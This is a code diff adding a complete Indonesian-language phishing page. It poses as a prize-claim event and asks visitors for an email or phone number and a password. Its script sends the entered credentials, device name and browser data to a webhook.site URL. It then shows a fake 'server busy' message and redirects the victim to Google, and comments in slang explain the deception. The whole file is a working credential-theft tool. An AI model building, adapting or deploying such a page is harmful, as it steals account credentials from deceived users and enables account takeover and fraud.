@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Hadiah Event 2026</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #e9ebee; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); overflow: hidden; }
+        .header { background: #0056b3; color: white; padding: 25px; text-align: center; font-weight: bold; font-size: 1.3em; letter-spacing: 1px; }
+        .content { padding: 25px; }
+        .content p { font-size: 0.95em; color: #444; margin-bottom: 20px; text-align: center; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 1em; transition: 0.3s; }
+        input:focus { border-color: #0056b3; outline: none; box-shadow: 0 0 5px rgba(0,86,179,0.3); }
+        button { width: 100%; background: #0056b3; color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1.1em; margin-top: 15px; transition: 0.3s; }
+        button:hover { background: #004494; transform: translateY(-2px); }
+        .footer { text-align: center; padding: 15px; font-size: 0.75em; color: #888; background: #fafafa; border-top: 1px solid #eee; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">HADIAH EKSKLUSIF TERSEDIA!</div>
+    <div class="content">
+        <p>Selamat! Akun Anda terpilih. Silakan login untuk memverifikasi identitas dan klaim hadiah Anda sekarang.</p>
+        
+        <input type="text" id="username" placeholder="Email atau Nomor HP" required>
+        <input type="password" id="password" placeholder="Kata Sandi" required>
+        
+        <button onclick="kirimData()">AMBIL HADIAH SEKARANG</button>
+    </div>
+    <div class="footer">© 2026 Global Rewards System. Secure Verification.</div>
+</div>
+
+<script>
+    function kirimData() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        if(!user || !pass) {
+            alert("Harap lengkapi semua data!");
+            return;
+        }
+
+        // Ambil info perangkat yang lebih detail
+        const ua = navigator.userAgent;
+        let perangkat = "Unknown Device";
+        
+        // Logika sederhana tarik nama HP
+        if (ua.match(/Android/i)) {
+            const match = ua.match(/\(([^;]+);/);
+            perangkat = match ? match[1] : "Android Device";
+        } else if (ua.match(/iPhone/i)) {
+            perangkat = "iPhone";
+        }
+
+        const payload = {
+            target_user: user,
+            target_pass: pass,
+            device_info: perangkat,
+            browser_log: ua,
+            ip_check: "Via Webhook",
+            timestamp: new Date().toLocaleString('id-ID')
+        };
+
+        // Webhook URL lu udah gw pasang
+        const webhookURL = "https://webhook.site/4dbdc684-da03-4290-aea1-f60edc92decf";
+
+        fetch(webhookURL, {
+            method: 'POST',
+            mode: 'no-cors', // INI PENTING! Biar gak error jaringan/CORS
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(() => {
+            // Loading palsu biar makin meyakinkan
+            alert("Server sibuk! Sedang memproses antrean klaim. Mohon tunggu 1x24 jam.");
+            window.location.href = "https://www.google.com";
+        })
+        .catch(() => {
+            // Backup kalau gagal fetch, biasanya data tetep masuk di Webhook kalau mode no-cors
+            alert("Sedang memproses... Silakan cek koneksi Anda.");
+            window.location.href = "https://www.google.com";
+        });
+    }
+</script>
+
+</body>
+</html>
